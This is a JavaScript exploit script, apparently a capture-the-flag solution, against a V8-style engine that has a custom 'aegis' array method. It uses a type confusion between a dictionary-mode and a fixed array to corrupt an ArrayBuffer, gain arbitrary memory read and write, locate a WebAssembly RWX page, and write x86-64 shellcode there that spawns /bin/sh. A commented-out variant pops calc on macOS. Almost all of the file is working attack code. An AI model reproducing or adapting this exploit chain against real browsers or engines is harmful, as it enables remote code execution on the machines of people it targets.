let base = new ArrayBuffer(8);
let f64 = new Float64Array(base);
let u32 = new Uint32Array(base);

function d2u(v) {
  f64[0] = v;
  return u32;
}

function u2d(lo, hi) {
  u32[0] = lo;
  u32[1] = hi;
  return f64[0];
}

function hex(lo, hi) {
    if( lo == 0 ) {
        return ("0x" + hi.toString(16) + "-00000000");
    }
    if( hi == 0 ) {
        return ("0x" + lo.toString(16));
    }
    return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}

// pop calc on macOS
//let shellcode = [0x90909090, 0x90909090, 3343384682, 1885417159, 3209189232, 1819632492, 1919906913, 1958692951, 1936617321, 1465991983, 1093648200, 1768714352, 1213686115, 6499775, 1852141679, 3209189152, 1852400175, 6845231, 3867756631, 2303197290, 3330492663, 2303219211, 3330492670, 2303219208, 2303219454, 3526445286, 2965385544, 3368110082, 255569960, 2425393157, 2425393296, 2425393296, 0x90909090, 0xcccccccc];

// pop shell on linux
var shellcode = new Uint32Array([0x90909090, 0x90909090, 0x4852e6f7, 0x69622fbb, 0x732f2f6e,
                                 0x8d485368, 0x3bb0243c, 0x90d23148, 0x90905152, 0x24348d48,
                                 0x9090050f, 0x90188948]);


let wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 4, 4, 1, 112, 0, 0, 5, 3, 1, 0, 1, 7, 21, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 8, 95, 90, 51, 97, 100, 100, 105, 105, 0, 0, 10, 9, 1, 7, 0, 32, 1, 32, 0, 106, 11]);
let wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});
let f = wasm_mod.exports._Z3addii;

let storage = [];

// Packed Double Array -> Fixed Array
// Fast Path
let arr = [1.1, 2.2, 3.3];

// Converted from Fixed Array to Dictionary mode
// Slow Path
arr[0x8000] = 1.1;

storage.push([1.1, 2.2, 3.3, 4.4]);
storage.push([u2d(0xcafebabe, 0xcafebabe), f]);
let ab = new ArrayBuffer(0x3232);

// "arr" is dictionary mode.
// But, "aegis" function uses the "arr" as Fixed Array
// So, Array mode "Type Confusion" occur.
// We can bypass length check routine.
arr.aegis(0x1f + 6, u2d(0, 0x4141));

let victim = storage[0];

for (let i = 0; i < 0x40; i++) {
  tmp = d2u(victim[i]);
  console.log(i + " : " + hex(tmp[0], tmp[1]));
}

let wasm_addr = d2u(victim[44]);

let dv = new DataView(ab);
victim[51] = u2d(wasm_addr[0] - 1, wasm_addr[1]);
lo = dv.getUint32(0x18, true);
hi = dv.getUint32(0x18 + 4, true);

console.log(hex(wasm_addr[0], wasm_addr[1]));
console.log(hex(lo, hi));

victim[51] = u2d(lo - 1 - 288, hi);
rwx_lo = dv.getUint32(0, true);
rwx_hi = dv.getUint32(4, true);

console.log(hex(rwx_lo, rwx_hi));

victim[51] = u2d(rwx_lo, rwx_hi);

for (let i = 0; i < shellcode.length; i++) {
  dv.setUint32(4 * i, shellcode[i], true);
}

console.log(u2d(0, 0x1000));

f();
